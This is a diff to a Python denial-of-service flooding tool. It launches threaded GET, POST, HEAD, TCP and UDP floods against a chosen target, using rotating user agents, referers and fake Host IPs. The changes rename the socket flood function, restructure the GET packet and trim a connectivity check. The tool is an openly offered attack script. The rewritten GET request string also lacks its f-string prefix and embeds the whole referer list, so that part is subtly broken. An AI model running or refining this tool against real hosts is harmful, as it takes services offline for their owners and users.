@@ -15,8 +15,13 @@ rd="\033[1;31m" #>Red   #
 gr="\033[1;32m" #>Green #
 yl="\033[1;33m" #>Yellow#
 #########################
+
 doseq = __file__
 __version__ = '1.0.0'
+i = 1
+attacks = ["get","post","head","tcp","udp"]
+fake_ip = lambda: ".".join(str(random.randint(0, 255)) for _ in range(4))
+
 headers_useragents = list()
 headers_useragents.append("Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36")
 headers_useragents.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
@@ -3344,13 +3349,9 @@ headers_referers.append('http://www.usatoday.com/search/results?q=')
 headers_referers.append("http://validator.w3.org/check?uri=")
 headers_referers.append("")
 os.system("cls || clear")
-get_data = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n'
-i = 1
-fake_ip = lambda: ".".join(str(random.randint(0, 255)) for _ in range(4))
-attacks = ["get","post","head","tcp","udp"]
 
 
-def syn_flood():
+def sock_flood():
     global i
     while True:
         try:
@@ -3367,7 +3368,7 @@ def syn_flood():
                 time.sleep(delay)
             s.close()
         except (socket.error, BrokenPipeError, Exception) as err:
-                   print("["+yl+"!"+wi+"] "+yl+"SYN-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+                   print("["+yl+"!"+wi+"] "+yl+f"{attack.upper()}-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
                    if isKilled():break
                    if hasattr(err, 'errno'):
                        if err.errno ==24:break
@@ -3379,7 +3380,7 @@ def get_attack():
          global i
          while True:
              try:
-                        get_packet = str("GET /"+target+" HTTP/1.1\r\nHost: "+fake_ip()+"\r\nUser-Agent: "+random.choice(headers_useragents)+"\r\n"+get_data).encode('ascii')
+                        get_packet = str("GET /{target} HTTP/1.1\r\nHost: {fake_ip()}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nReferer: {headers_referers}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n").encode('ascii')
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.settimeout(5)
                         s.connect((target,port))
@@ -3486,6 +3487,7 @@ def head_attack():
                 if err.errno == 24: break
             continue
         if isKilled():break
+
 
 def cnet(server='www.google.com', port=80) -> bool:
    try:
@@ -3642,20 +3644,11 @@ if target.startswith(("https://", "http://")):
 else:
     url = "http://"+target + "/"
 target = urlparse(url).netloc
-print(wi+"["+yl+"~"+wi+"] Check Internet Connection [...]", end='\r')
-time.sleep(2)
-if not cnet():
-    print("["+rd+"-"+wi+"] Check Internet Connection ["+rd+"Fail"+wi+"]\n", end='\r')
-    print("  ["+rd+"!"+wi+"]"+yl+" Please Check Your Internet Connection And Try Again "+rd+"!!!"+wi)
-    if target.startswith(("www.google.","google.")):
-        sys.exit(1)
-else:
-    print("["+gr+"+"+wi+"] Check Internet Connection ["+gr+"Connected"+wi+"]\n", end='\r')
 print(wi + "[" + yl + "~" + wi + f"] Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [...]", end='\r')
 time.sleep(2)
 if not cnet(target,port):
     print("["+rd+"-"+wi+"] Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+rd+"Fail"+wi+"]\n", end='\r')
-    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+rd+" !!!\n"+wi)
+    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+yl+f"::: {'Please Check Your Internet Connection' if not cnet() else 'Please Check Your Target and port'} !!!\n"+wi)
     sys.exit(1)
 print("["+gr+"+"+wi+"]"+wi+f" Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+gr+"Connected"+wi+"]\n", end='\r')
 print(wi+"["+yl+"~"+wi+"] Starting "+gr+f"{threads}"+wi+" Threads [...]", end='\r')
@@ -3676,6 +3669,7 @@ time.sleep(1.5)
 
 threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if attack in ['get','post'] else threads
 started = True
+
 for _ in range(threads):
     if attack == 'get':
            t1 = threading.Thread(target=get_attack)
@@ -3701,7 +3695,7 @@ for _ in range(threads):
            t5.start()
            THREADS.append(t5)
     else:
-           t6 = threading.Thread(target=syn_flood)
+           t6 = threading.Thread(target=sock_flood)
            t6.daemon = True
            t6.start()
            THREADS.append(t6)
@@ -3710,6 +3704,7 @@ for _ in range(threads):
 
 for t in THREADS:
     t.join()
+
 ##############################################################
 #####################                #########################
 #####################   END OF TOOL  #########################
